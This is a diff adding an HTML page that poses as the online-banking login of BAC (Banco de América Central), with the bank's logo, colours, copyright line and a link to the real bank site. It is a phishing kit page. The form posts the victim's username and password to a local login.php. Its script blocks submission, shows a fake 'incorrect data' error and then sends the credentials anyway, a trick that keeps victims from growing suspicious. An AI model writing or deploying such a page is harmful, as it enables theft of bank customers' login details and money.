@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.png" type="image/x-icon">
+    <title>Login BAC</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" crossorigin="anonymous">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="styles.css">
+
+    <!-- SweetAlert -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+        /* Estilos para el campo de contraseña y el ícono del ojo */
+        .password-container {
+            position: relative;
+        }
+        
+        #password {
+            padding-right: 30px;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <center>
+            <img src="Logo.png" alt="Logo de BAC" style="width: 180px; height: auto; margin-bottom: 0px;">
+                <h3 style="color: #e4042b;"><strong>Banca en línea</strong></h3> 
+                <p style="color: #888; font-size: 15px;">Inicie sesión con los datos de su banca móvil</p> 
+                <form class="form" method="POST" action="login.php" name="login" autocomplete="off" id="loginForm">
+                    <div class="form-group">
+                        <input type="text" id="user" name="user" placeholder="Usuario" required>
+                    </div>
+                    <div class="form-group password-container">
+                        <input type="password" id="password" name="password" placeholder="Contraseña" required>
+                    </div>
+                    <button type="submit" id="submitBtn" disabled>Iniciar Sesión</button>
+                </form>
+                <p style="margin-top: 10px;">¿Aún no eres cliente? <a href="https://www.baccredomatic.com/" style="color: #e4042b; text-decoration: none;">Haz clic aquí</a></p>
+            </center>
+        </div>
+    </div>
+    <p class="footer-text">2024 Banco de América Central S.A. (BAC). Todos los derechos reservados.</p>
+    <br>
+    <br>
+    <br>
+    <br>
+
+    <script>
+        const userInput = document.getElementById('user');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        const form = document.getElementById('loginForm');
+        const togglePassword = document.querySelector('.toggle-password');
+
+        function checkForm() {
+            submitBtn.disabled = !(userInput.value.trim() !== "" && passwordInput.value.trim() !== "");
+        }
+
+        userInput.addEventListener('input', checkForm);
+        passwordInput.addEventListener('input', checkForm);
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            Swal.fire({
+                title: '¡Datos incorrectos!',
+                text: 'Por favor, revise su usuario y contraseña.',
+                icon: 'error',
+                confirmButtonText: 'Reintentar'
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    document.forms['login'].submit();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
